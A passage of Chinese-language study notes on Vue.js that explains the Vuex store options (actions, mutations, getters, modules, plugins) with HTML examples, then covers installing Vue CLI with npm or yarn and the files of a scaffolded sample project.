​	在单项数据流的图示中，Actions中定义事件回调方法，通过Dispatch触发事件处理方法，例如`store.dispatch('事件处理方法名称')`，并且Actions是异步的。Mutations通过Commit提交，例如，`store.commit('事件处理方法名称')`，并且Mutations是同步的。从职责上，Actions负责业务的代码，而Mutations专注于修改State。在提交Mutations时，devtools调试工具完成Mutations状态变化的跟踪。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312262239922.png" alt="vuex" style="zoom: 67%;" />

### 6.2.Vuex配置选项

#### 6.2.1.actions

​	`actions`选项用来定义事件处理方法，用于处理state数据。`actions`类似于`mutations`，不同之处在于`actions`是异步执行的，事件处理函数可以接收{commit}对象，完成`mutation`提交，从而方便devtools调试工具跟踪状态的state变化。

​	在使用时，需要在`store`仓库中注册`actions`选项，在里面定义事件处理方法。事件处理方法接收`context`作为第一个参数，`payload`作为第二个参数。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312271420708.png" alt="image-20231227142029517" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="mut">查看mutations接收的参数</button>
            <button @click="act">查看actions接收的参数</button>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建store对象
                var store = new Vuex.Store({
                    state: {
                        name: '张三',
                        age: 38,
                        gender: '男'
                    },
                    mutations: {
                        test (state) {
                            console.log(state)
                        }
                    },
                    actions: {
                        test (context, param) {
                            console.log(context)
                            console.log(param)
                        }
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        store,
                        methods: {
                            mut () {
                                this.$store.commit('test')
                            },
                            act () {
                                this.$store.dispatch('test')
                                // this.$store.dispatch('test', '我是传递的参数')
                                // this.$store.dispatch({ type: 'test', name: '我是传递的参数' })
                            }
                        }
                })
        </script>
</body>
</html>
```

#### 6.2.2.mutations

​	`mutations`选项中的事件处理方法接收state对象作为参数，即初始数据，使用时只需要在store实例配置对象中定义state即可。`mutations`中的方法用来进行state数据操作，在组件中完成`mutations`提交就可以完成组件状态更新。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <button @click="param">传递参数</button>
            <p>{{ this.$store.state.param }}</p>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                var store = new Vuex.Store({
                    state: { param: '' },
                    mutations: {
                        receive (state, param) {
                            state.param = param
                            // console.log(param)        // 查看接收到的param值
                            // state.param = param.name
                        }
                    },
                    actions: {
                        param (context){
                            context.commit('receive', '我是传递的参数')
                        // context.commit({ type: 'receive', name: '我是传递的参数' })
                            }
                        }
                    })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        store,
                        methods: {
                            param () {
                                this.$store.dispatch('param')
                            }
                        }
                })
        </script>
</body>
</html>
```

#### 6.2.3.getters

​	store实例允许在store中定义`getters`计算属性，类似于Vue实例的`computed`。`getters`返回值会根据它的依赖进行处理然后缓存起来，且只有当它的依赖值发生改变时才会被重新计算。

​	案例：根据列表id查询：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312271502846.gif" style="zoom:50%;" />

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h2>列表查询</h2>
            <input type="text" v-model="id">
            <button @click="search">搜索</button>
            <p>搜索结果：{{ this.$store.getters.search }}</p>
            <ul>
                <li v-for="item in this.$store.state.todos">{{ item }}</li>
            </ul>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                const store = new Vuex.Store({
                    state: {
                        todos: [
                            { id: 1, name: '杜鑫' },
                            { id: 2, name: '谢岳岚' },
                        ],
                        id: 0
                    },
                    mutations: {
                        search (state, id) {
                            state.id = id
                        }
                    },
                    getters: {
                        search: state => {
                            return state.todos.filter(todo => todo.id == state.id)
                        }
                    }
                    })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {id:''},
                        store,
                        methods: {
                            search() {
                                this.$store.commit('search', this.id)
                            }
                        },
                        
                })
        </script>
</body>
</html>
```

#### 6.2.4.modules

​	`modules`用来在store实例中定义模块对象。在项目开发中，页面组件存在多种状态，且时通过单一状态树形式实现数据状态可跟踪的，Vue为了解决当前这种复杂应用状态，提出了类似于模块化开发的方法对store对象仓库进行标准化管理。

```vue
key: {  // key表示模块名称
  state, // 初始数据
  mutations, // 状态提交，同步
  actions, // 状态分发，异步
  getters, // 计算属性
  modules // 模块
}
```

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                const moduleA = {
                    state: { nameA: 'A' },
                    }
                const moduleB = {
                    state: { nameB: 'B' },
                    }
                const store = new Vuex.Store({
                    modules: {
                        a: moduleA,
                        b: moduleB
                    }
                })
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {},
                        store
                })
                console.log(store.state.a)
                console.log(store.state.b)
        </script>
</body>
</html>
```

​	控制台打印出A、B两个模块，说明这两个模块已被注册。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312271508364.png" alt="image-20231227150857231" style="zoom:50%;" />

#### 6.2.5.plugins

​	Vuex中的插件配置选项为`plugins`，插件本身为函数。函数接收参数store对象作为参数，store实例对象的`subscribe`函数可以用来处理`mutation`，函数接收参数为`mutation`和`state`。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <script src="../js/vuex.js"></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                const myPlugin = store => {
                    // 当store初始化后调用
                    store.subscribe((mutation, state) => {
                        // 每次mutation提交后调用，mutation格式为 {type, payload}
                        console.log(mutation.type, mutation.payload)
                    })
                    }
                    const store = new Vuex.Store({
                        mutations: {
                            do (state) {
                            console.log(state)
                        }
                    },
                    plugins: [myPlugin]
                    })
                    store.commit('do', 'plugin')
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {}
                })
        </script>
</body>
</html>
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312271513325.png" alt="image-20231227151332206" style="zoom:50%;" />

## 7.Vue-cli脚手架工具

​	当使用Vue构建项目时，在页面中通过`<script>`标签引入`vue.js`文件，这种方式仅适用于简单的案例，在实际的开发中，往往需要处理复杂的业务逻辑，那么通过`<script>`引入的方式就不太合适了，此时需要借助Vue脚手架工具，它可以帮助我们快速的构建一个适用于实际项目中的环境。

​	Vue脚手架是Vue官方提供的标准化**开发工具**。它可以自动生成vue.js+webpack的项目模板。可用于定制新项目、配置原型、添加插件和检查webpack配置等。

​	**特别注意**：[Vue脚手架](https://so.csdn.net/so/search?q=Vue脚手架&spm=1001.2101.3001.7020)是用来方便开发的，但vue脚手架不是最终发布到生产环境的产品。很多人会误认为生产环境也要安装vue脚手架。

​	官方文档：https://cli.vuejs.org/zh/

### 7.1.安装脚手架

卸载旧版：

```shell
npm uninstall vue-cli -g
```

```shell
npm uninstall @vue/cli -g
```

**安装和创建推荐使用yarn的方式，因为该方式比npm更快：**

`npm config set registry https://registry.npm.taobao.org`

```shell
npm uninstall -g yarn				# 卸载yarn
npm i yarn -g						# 安装yarn
yarn -v								# 检查yarn是否安装
yarn global add @vue/cli			# 通过yarn下载cli
vue create demo						# 创建项目（如出现vue不是内部命令提示，可按下面操作）
yarn global bin						# 将路径配置到环境变量Path中
```





1.全局安装@vue/cli(仅安装一次即可)：

```shell
npm install -g vue-cli												# 安装旧版2.9.6

npm install -g @vue/cli --registry=https://registry.npm.taobao.org    # 安装新版3.x-5.x
# OR
yarn global add @vue/cli --registry=https://registry.npm.taobao.org
```

![image-20230222191150414](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221911748.png)

查看版本：

```shell
vue -V  V大写
```



2.创建一个项目（切换到要创建的文件夹）：

```shell
vue create hello_vue
# OR
vue ui
```

如出现如下安装情况说明vue-cli版本过低，可参考链接：

![image-20230223113657767](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302231137002.png)

https://blog.csdn.net/zlzbt/article/details/110136755

![image-20230302222042657](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202303022220850.png)

​	在创建项目时，Vue CLI提示用户选取一个preset(预设)，Default是默认选项，包含基本的babel+eslint设置，适合快速创建一个新项目；Manually select features表示手动配置，提供可选择的npm包，更适合生产时的项目，在实际工作中推荐使用该种方式。

3.进入项目目录`cd hello_vue`启动项目：

```shell
npm run serve

# or

yarn serve
```

运行加载后，会出来两个地址：

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202305092014025.png)

复制任意一个地址到浏览器中就可以访问，这是Vue为我们写好的helloworld案例：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202305092015957.png" alt="image-20230509201545668" style="zoom:50%;" />





webpack创建参考：https://blog.csdn.net/u013034585/article/details/106763710?ops_request_misc=&request_id=&biz_id=102&utm_term=%E5%88%9B%E5%BB%BAvue%E8%84%9A%E6%89%8B%E6%9E%B6%E5%BE%88%E5%8D%A1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-106763710.142^v76^pc_new_rank,201^v4^add_ask,239^v2^insert_chatgpt&spm=1018.2226.3001.4187

注意：

1.如出现下载缓慢，需要把npm切换为淘宝镜像：`npm config set registry https://registry.npm.taobao.org`

2.Vue脚手架隐藏了所有webpack相关配置，若想查看具体配置，请执行：`vue inspect > output.js`。

3.如果一直创建脚手架工程出现卡顿，参考https://www.jb51.net/article/265182.htm

https://www.jianshu.com/p/180f645fcccc



### 7.2.脚手架工程文件介绍

```text
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202305092045385.png)

脚手架测试：创建`hello_vue`工程并添加以下代码：

**School.vue：**

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'四川城市职业学院',
				address:'成都龙泉'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```



**Student.vue:**

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```



**App.vue:**

```vue
<template>
	<div>
    <img src="./assets/logo.png" alt="log">
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './components/School.vue'
	import Student from './components/Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```



**main.js:**

```javascript
// 创建Vue对象，引入App.vue文件
import App from './App.vue'
import Vue from 'vue'
    
new Vue({
    render: h => h(App),
}).$mount('#app')
```



**index.html:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div id="root"></div>
    <script src="../../js/vue.js"></script>
    <script src="../src/main.js"></script>
</body>
</html>
```

​	执行命令`npm run serve`运行程序，按住`Ctrl`点击进入。如出现以下问题则是Vue的风格规范中需要将组将名命名为多个单词，你可以改变组件名，也可以在`vue.config.js`(该文件为配置项文件，和`package.js同级`)中添加**关闭语法检测**的代码`lintOnSave:false`：

![image-20230509210350996](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202305092103164.png)

![image-20230509210405378](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202305092104938.png)





页面正常显示：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202305092106678.png" alt="image-20230509210608539" style="zoom:50%;" />



​	**使用vue.config.js可以对脚手架进行个性化定制，参考：https://cli.vuejs.org/zh/config/#vue-config-js**